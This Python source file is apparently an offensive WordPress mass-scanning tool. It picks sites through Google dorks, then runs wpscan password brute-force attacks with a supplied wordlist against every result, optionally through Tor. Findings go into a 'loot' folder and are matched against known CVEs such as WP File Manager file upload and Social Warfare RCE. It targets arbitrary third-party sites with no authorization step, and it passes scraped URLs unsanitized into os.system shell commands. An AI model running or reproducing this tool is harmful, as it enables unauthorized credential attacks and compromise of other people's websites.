# -*- coding: utf-8 -*-


import os
import signal
import time
import subprocess
import json

from googlesearch import search
from urllib.parse import urlparse
from pathlib import Path
from termcolor import colored
from subprocess import check_output
from prettytable import from_db_cursor
from prettytable import PrettyTable


def checkvuln(pathfile):
    """Check for common vulnerabilities"""

    with open(pathfile) as json_file:
        obj_data = json.load(json_file)

        # Check vulnerabilities only if scanned was completed successfully using password_attack key in dict
        if 'password_attack' in obj_data:
            # CHECK CORE WORDPRESS VULNERABLE VERSION
            if obj_data['version']:
                if str(obj_data['version']['number']) == '4.6':
                    print(colored("\t > WordPress " + obj_data['version']['number'] + " vulnerable to RCE (CVE-2016-10033)", 'magenta'))
                    time.sleep(5)

            # JOOMSPORT
            if 'joomsport' in str(obj_data) and obj_data['plugins']['joomsport-sports-league-results-management'][
                'version']:
                # Check for vulnerability version in JoomSport 3.3 - SQL INJECTION
                if str(obj_data['plugins']['joomsport-sports-league-results-management']['version']['number']) == '3.3':
                    print(colored("\t > JoomSport " +
                                  obj_data['plugins']['joomsport-sports-league-results-management']['version'][
                                      'number'] + " vulnerable to SQL Injection (CVE-2019-14348)", 'magenta'))
                    time.sleep(5)

            # SOCIAL WARFARE
            if 'Social Warfare' in str(obj_data) and obj_data['plugins']['social-warfare']['version']:
                # Check for vulnerability version in Social Warfare Plugin < 3.5.3 - RCE
                if str(obj_data['plugins']['social-warfare']['version']['number']) < '3.5.3':
                    print(colored("\t > Social Warfare " + obj_data['plugins']['social-warfare']['version'][
                        'number'] + " vulnerable to Remote Code Execution (CVE-2019-9978)", 'magenta'))
                    time.sleep(5)

            # CONTACT FORM 7
            if 'contact-form-7' in str(obj_data) and obj_data['plugins']['contact-form-7']['version']:
                # Check for vulnerability version in Contact Form 7 - Unrestricted File Upload
                if str(obj_data['plugins']['contact-form-7']['version']['number']) < '5.3.2':
                    print(colored("\t > Contact Form " + obj_data['plugins']['contact-form-7']['version'][
                        'number'] + " vulnerable to Unrestricted File Upload (CVE-2020-35489)", 'magenta'))
                    time.sleep(5)

            # YOAST SEO
            if 'wordpress-seo-premium' not in str(obj_data):
                if 'wordpress-seo' in str(obj_data) and obj_data['plugins']['wordpress-seo']['version']:
                    # Check for vulnerability version in Yoast SEO - Blind SQL Injection
                    if str(obj_data['plugins']['wordpress-seo']['version']['number']) == '1.7.3.3':
                        print(colored("\t > Yoast SEO " + obj_data['plugins']['wordpress-seo']['version'][
                            'number'] + " vulnerable to Blind SQL Injection (CVE-2015-2292)", 'magenta'))
                        time.sleep(5)

            # WP FILE MANAGER
            if 'wp-file-manager' in str(obj_data) and obj_data['plugins']['wp-file-manager']['version']:
                # Check for vulnerability version in WP File Manager - Unauthenticated Arbitary File Upload
                if str(obj_data['plugins']['wp-file-manager']['version']['number']) < '6.9':
                    print(colored("\t > WP File Manager " + obj_data['plugins']['wp-file-manager']['version'][
                        'number'] + " vulnerable to Unauthenticated Arbitary File Upload (CVE-2020-25213)", 'magenta'))
                    time.sleep(5)

        # Check for some errors, timeouts, WAF, and so on..
        elif 'WAF' in str(obj_data):
            print(colored("\t > WAF Detected!", 'red'))
            time.sleep(5)
        elif 'Timeout was reached' in str(obj_data):
            print(colored("\t > Timeout Reached!", 'red'))
            time.sleep(5)
        elif 'scan_aborted' in str(obj_data):
            print(colored("\t > Aborted due to some redirect or website not running WordPress!", 'red'))
            time.sleep(5)
        elif 'Couldn\'t connect to server' in str(obj_data):
            print(colored("\t > Couldn't connect to server!", 'red'))
            time.sleep(5)
        else:
            print(colored("\t > Aborted for unrecognized error!", 'red'))
            time.sleep(5)


def showdorks():
    """Show WordPress google dorks available and returns chosen"""

    dorks = [
        "inurl:wp-login.php",
        "inurl:wp-admin",
        "inurl:wp-content/uploads",
        "intitle:WordPress Login",
        "intitle:Login to Your WordPress Site",
        "intext:Powered by WordPress",
        "intext:Powered by WordPress - Just another WordPress site",
        "intext:Powered by WordPress | Theme by",
        "inurl:/wp-json/wp/",
        "inurl:/wp-json/wp/v2/",
        "inurl:/wp-json/oembed/",
        "inurl:/wp-json/oembed/1.0/embed",
        "inurl:/xmlrpc.php",
        "inurl:/wp-includes/",
        "\"index of\" inurl:wp-content/",
        "\"inurl:\"/wp-content/plugins/wp-shopping-cart/\"",
        "inurl:wp-content/ inurl:http before:2016 -filetype.pdf",
        "\"index of \":wp-content/ intitle:\"WordPress\"",
        "intext:powered by JoomSport - sport WordPress plugin",
        "inurl:wp-content/plugins/social-warfare",
        "inurl:wp-content/plugins/contact-form-7",
        "inurl:wp-content/plugins/wordpress-seo",
        "inurl:wp-content/plugins/elementor",
        "inurl:wp-content/plugins/woocommerce",
        "inurl:wp-content/plugins/jetpack",
        "inurl:wp-content/plugins/akismet",
        "inurl:wp-content/plugins/wpforms",
        "inurl:wp-content/plugins/all-in-one-seo-pack",
        "inurl:wp-content/plugins/wordfence",
        "inurl:wp-content/plugins/updraftplus",
        "inurl:/wp-content/themes/",
        "inurl:/wp-content/plugins/",
        "inurl:/wp-content/advanced-cache.php",
        "inurl:/wp-content/languages/",
        "inurl:/wp-content/themes/twenty",
        "inurl:/wp-content/uploads/sites/",
        "inurl:/wp-admin/admin-ajax.php",
        "inurl:/wp-admin/admin-post.php",
        "inurl:/wp-admin/admin-ajax.php?action=revslider_ajax_action",
        "inurl:/wp-admin/admin-ajax.php?action=layered_popups_get_popup",
        "inurl:/wp-admin/admin-ajax.php?action=duplicator_download",
        "inurl:/wp-admin/admin-ajax.php?action=updraft_ajax"
    ]

    table = PrettyTable()
    table.field_names = ["NUM", "DORK", "INFO"]

    for index, dork in enumerate(dorks, start=1):
        table.add_row([index, dork, "WordPress dork"])

    print()
    print(colored(table, 'magenta'))
    print()

    dork = "inurl:wp-login.php"

    while True:
        response = input(colored(" > Choose dork to run [1-{0}] ".format(len(dorks)), 'yellow'))
        if response.isdigit():
            response = int(response)
            if 1 <= response <= len(dorks):
                dork = dorks[response - 1]
                break

    return dork


def scrape_google(dork, amount):
    """Scrape Google search results based on the selected dork"""

    print(colored(" Scraping Google results..", 'red'))
    print()

    for result in search(dork, tld="com", lang="en", num=int(amount), start=0, stop=None, pause=2):
        print(colored(" - " + result, 'green'))
        time.sleep(0.1)


def wpscan(wpurl, wordlists, pathfile, usetor):
    """Run wpscan"""

    if usetor:
        # Run wpscan with tor
        os.system(
            "wpscan --disable-tls-checks --request-timeout 500 --connect-timeout 120 --url " + wpurl + " --proxy socks5://127.0.0.1:9050 --rua -o " + pathfile + " -f json --passwords " + wordlists)
        checkvuln(pathfile)
    else:
        # Run wpscan without tor
        os.system(
            "wpscan --disable-tls-checks --url " + wpurl + " --rua -o " + pathfile + " -f json --passwords " + wordlists)
        checkvuln(pathfile)


def main():
    """Main function of the tool"""

    print("""\033[91m 
╦ ╦╔═╗╦═╗╔╦╗╔═╗╦═╗╔═╗╔═╗╔═╗  ╔═╗╔═╗╔═╗╔╗╔╔╗╔╔═╗╦═╗
║║║║ ║╠╦╝ ║║╠═╝╠╦╝║╣ ╚═╗╚═╗  ╚═╗║  ╠═╣║║║║║║║╣ ╠╦╝
╚╩╝╚═╝╩╚══╩╝╩  ╩╚═╚═╝╚═╝╚═╝  ╚═╝╚═╝╩ ╩╝╚╝╝╚╝╚═╝╩╚═

    \x1b[0m""")

    print(colored(" -------------------", 'green'))
    print(colored(" 1. Scrape Google", 'green'))
    print(colored(" 2. Scan Using WPScan", 'green'))
    print(colored(" 3. Exit", 'green'))
    print(colored(" -------------------", 'green'))
    print()

    while True:
        response = input(colored(" > Enter your choice [1-3] ", 'yellow'))
        if not response.isnumeric():
            main()
            continue
        else:
            break

    if int(response) == 3:
        os.system("clear")
        exit(0)
    elif int(response) != 1 and int(response) != 2:
        main()

    if int(response) == 1:
        dork = showdorks()

        while True:
            response = input(colored(" > Enter the number of results to retrieve: ", 'yellow'))
            if not response.isnumeric():
                print(colored(" Please insert a number", 'red'))
                continue
            else:
                amount = response
                break

        scrape_google(dork, amount)

    elif int(response) == 2:
        dork = showdorks()

        while True:
            response = input(colored(" > Enter the number of results to scan: ", 'yellow'))
            if not response.isnumeric():
                print(colored(" Please insert a number", 'red'))
                continue
            else:
                amount = response
                break

        while True:
            response = input(colored(" > Type the full path to the password wordlist: ", 'yellow'))
            if not os.path.isfile(response):
                print(colored(" Unable to access file!", 'red'))
                continue
            else:
                wordlist = response
                break

        usetor = False

        while True:
            response = input(colored(" > Use WPScan with TOR? [yes/no] ", 'yellow'))
            if not response.isalpha():
                continue
            if response == 'yes' or response == 'no':
                break
        if response == 'yes':
            # Check if tor is installed
            rc = subprocess.call(['which', 'tor'], stdout=subprocess.PIPE)
            if rc:
                # Asking for a valid response
                while True:
                    response = input(colored(" Unable to find TOR! Run without it? [yes/no]", 'yellow'))
                    if not response.isalpha():
                        print(colored(" Please type yes or no", 'red'))
                        continue
                    if response == 'yes' or response == 'no':
                        break
                if response == 'yes':
                    print(colored(" Running the scan with TOR disabled..", 'red'))
                    usetor = False
                else:
                    print(colored(" * Exiting..", 'yellow'))
                    exit(0)
            else:
                # Start TOR
                print()
                print(colored(" Starting the TOR network..", 'red'))
                os.system("tor --quiet &")
                time.sleep(5)
                usetor = True

        for result in search(dork, tld="com", lang="en", num=int(amount), start=0, stop=None, pause=8):
            parsed_uri = urlparse(result)
            wordpress = '{uri.scheme}://{uri.netloc}/'.format(uri=parsed_uri)
            # wordpress = "http://192.168.1.33/wordpress/"

            # Create filename
            filename = parsed_uri.netloc + ".json".strip('\n')
            pathfile = "loot/" + filename

            if Path(pathfile).is_file():
                # File exists already so skip this host and not increment requ var
                print(colored(" - Skipping " + wordpress + " (already scanned)", 'green'))
                # Sleep to avoid ban from google
                time.sleep(10)
                continue

            print(colored(" + Scanning " + wordpress, 'green'))
            wpscan(wordpress, wordlist, pathfile, usetor)
            time.sleep(0.1)

        if usetor:
            # Kill TOR
            print()
            print(colored(" Killing the TOR pid..", 'red'))
            os.kill(int(check_output(["pidof", "tor"])), signal.SIGTERM)

    print(colored(" Completed", 'magenta'))


if __name__ == '__main__':
    os.system("clear")
    main()
